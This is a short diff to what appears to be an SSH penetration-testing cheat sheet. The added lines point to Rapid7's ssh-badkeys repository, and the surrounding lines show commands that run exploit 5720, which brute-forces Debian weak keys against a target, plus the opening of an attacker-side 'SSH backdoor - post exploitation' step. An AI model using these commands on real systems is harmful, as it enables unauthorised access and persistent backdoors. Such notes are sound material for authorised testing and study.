@@ -18,6 +18,10 @@ tar -xvf debian_ssh_dsa_1024_x86.tar
 python 5720 rsa/2048 <IP> <USER> <PORT> <THREADS>
 python 5720 dsa/1024 <IP> <USER> <PORT> <THREADS>
 
+# Badkey
+# Validate with fingerprint
+https://github.com/rapid7/ssh-badkeys
+
 # SSH backdoor - post exploitation
 # Attacker
 ssh-keygen -f <FILENAME>
